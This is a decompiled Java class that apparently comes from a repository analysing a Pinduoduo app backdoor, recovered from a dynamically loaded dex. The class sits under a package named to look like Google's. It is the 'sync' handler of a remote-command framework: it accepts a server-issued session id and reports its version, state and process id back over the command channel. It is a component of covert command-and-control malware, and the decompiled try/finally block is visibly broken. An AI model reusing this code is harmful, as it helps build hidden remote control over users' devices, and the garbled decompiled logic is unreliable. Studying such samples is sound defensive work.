package com.google.android.sd.biz_dynamic_dex.sync;

import android.content.Context;
import android.os.Process;
import android.text.TextUtils;
import com.google.android.sd.biz_dynamic_dex.base.DynamicCmdExecutor;
import com.google.android.sd.cmd.CmdData;
import com.google.android.sd.cmd.CmdHandler;
import com.google.android.sd.utils.Utils;
import org.json.JSONObject;

public class SyncExecutor extends DynamicCmdExecutor {
  private final int CMD = 2;
  
  protected void realExecute(Context paramContext, String paramString) throws Exception {
    if (TextUtils.isEmpty(paramString))
      return; 
    JSONObject jSONObject = new JSONObject(paramString);
    CmdData cmdData = new CmdData(2, jSONObject.optString("uuid"), "client");
    if (!isReadyToExecute(paramContext)) {
      CmdHandler.dispatch(paramContext, Utils.buildErrorRespData(cmdData, "not ready", null));
      return;
    } 
    String str = jSONObject.optString("sid");
    if (!TextUtils.isEmpty(str)) {
      CmdHandler.setSid(str);
      Utils.updateSid(paramContext, str);
      JSONObject jSONObject1 = new JSONObject();
      try {
        jSONObject1.put("ver", CmdHandler.getVersion());
        jSONObject1.put("state", 1);
        jSONObject1.put("pid", Process.myPid());
      } finally {
        Exception exception;
      } 
      CmdHandler.dispatch(paramContext, Utils.buildSucceedRespData(cmdData, jSONObject1, null));
      return;
    } 
    CmdHandler.dispatch(paramContext, Utils.buildErrorRespData(cmdData, "no sid get", null));
  }
}


/* Location:              C:\Users\daimiaopeng\Downloads\pinduoduo_backdoor-main\pinduoduo_backdoor-main\dex\f4247da0-6274-44eb-859a-b4c35ec0dd71-dex2jar.jar!\com\google\android\sd\biz_dynamic_dex\sync\SyncExecutor.class
 * Java compiler version: 6 (50.0)
 * JD-Core Version:       1.1.3
 */